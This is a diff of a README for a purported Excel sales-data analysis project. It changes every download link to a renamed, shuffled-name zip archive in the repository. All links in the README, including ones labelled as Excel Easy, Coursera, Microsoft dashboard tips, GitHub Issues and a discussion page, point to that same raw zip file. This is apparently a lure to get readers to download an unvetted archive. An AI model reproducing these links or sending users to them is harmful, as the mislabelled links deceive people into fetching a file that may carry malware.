@@ -1,6 +1,6 @@
 # 🌼 Ferns-and-Petals-Sales-Data-Analysis - Analyze Your Sales Data Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip%https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)
+[![Download](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip%https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)
 
 ## 📄 Project Overview
 
@@ -21,7 +21,7 @@ To get started with the Ferns-and-Petals Sales Data Analysis project, follow the
 
 You can download the latest version of the application from our releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)
 
 Make sure to download the correct version for your system.
 
@@ -52,9 +52,9 @@ Make sure to download the correct version for your system.
 
 If you are new to data analysis or Microsoft Excel, here are some resources to help you learn:
 
-- **Excel for Beginners**: [Excel Easy](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)
-- **Data Analysis Basics**: [Coursera Data Analysis Courses](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)
-- **Dashboard Design Tips**: [Microsoft Office Dashboard Best Practices](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip)
+- **Excel for Beginners**: [Excel Easy](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)
+- **Data Analysis Basics**: [Coursera Data Analysis Courses](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)
+- **Dashboard Design Tips**: [Microsoft Office Dashboard Best Practices](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip)
 
 ## 🛠️ Troubleshooting
 
@@ -68,7 +68,7 @@ If you encounter any issues while using the application, consider these steps:
 
 If you need further assistance or want to connect with other users, feel free to reach out:
 
-- **GitHub Issues**: Report problems and find solutions on our [GitHub Issues page](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip).
-- **Join the Discussion**: Connect with users and share tips on our [Discussion page](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/Ferns-and-Petals-Sales-Data-Analysis.zip).
+- **GitHub Issues**: Report problems and find solutions on our [GitHub Issues page](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip).
+- **Join the Discussion**: Connect with users and share tips on our [Discussion page](https://raw.githubusercontent.com/Santhosh-byte-oss/Ferns-and-Petals-Sales-Data-Analysis/main/Silvanus/and-Analysis-Sales-Ferns-Petals-Data-2.6.zip).
 
 Thank you for using the Ferns-and-Petals Sales Data Analysis tool. We hope it helps you gain valuable insights into your sales data.
